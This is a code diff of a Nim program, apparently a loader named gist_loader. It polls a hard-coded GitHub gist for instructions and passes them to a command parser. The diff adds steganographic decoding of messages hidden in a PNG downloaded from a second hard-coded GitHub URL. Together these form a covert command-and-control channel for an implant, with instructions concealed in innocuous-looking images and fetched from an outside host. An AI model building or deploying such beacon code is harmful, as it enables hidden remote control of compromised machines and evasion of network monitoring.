@@ -5,6 +5,8 @@ import std/strutils
 import std/uri
 import std/os
 import std/asyncdispatch
+import pixie
+import steganography
 
 proc parse_instruction(command: string, location: string, cmd_line: string): bool =
     case command:
@@ -28,15 +30,12 @@ proc get_instruction(location: string): Future[string] =
     client.close()
     return aResult
 
-proc get_image(location: string): Future[seq[byte]] =
-    var stegResult = newFuture[seq[byte]]
+proc get_image(location: string): Future[string] =
+    var stegResult = newFuture[string]("get_image")
     var client = newHttpClient()
     try:
         downloadFile(client, location, "photo.png")
-        var stegfile = open("photo.png", FileMode.fmReadWriteExisting, -1)
-        var dest: array[stegfile.getFileSize(), uint8]
-        stegfile.readBytes(dest, 0, stegfile.getFileSize)
-        stegResult.complete()
+        stegResult.complete(decodeMessage(readImage("photo.png")))
     except:
         stegResult.fail(newException(OSError, "Failed to get picture"))
     client.close()
@@ -49,6 +48,7 @@ proc handle_loop(location: string, stego_location: string, sleep_amount: int) {.
         var res = await get_instruction(location)
         var steg_res = await get_image(stego_location)
         if last_instruction != res:
+            echo(steg_res)
             last_instruction = res
             var command = res.split(" ")
             if command.len < 2 or not parse_instruction(command[0], command[1], join(command[2..<command.len] , " ")):
@@ -59,7 +59,7 @@ when isMainModule:
     var gist_location: string
     var sleep_time = 5
     var default_gist = "https://gist.githubusercontent.com/bartimus-primed/4042ba41ec3a4b30633f0395874363f3/raw"
-    var default_stego = "https://raw.githubusercontent.com/bartimus-primed/gist_loader/master/test.png"
+    var default_stego = "https://raw.githubusercontent.com/bartimus-primed/gist_loader/master/logo.png"
     var args = initOptParser("")
     while true:
         args.next()
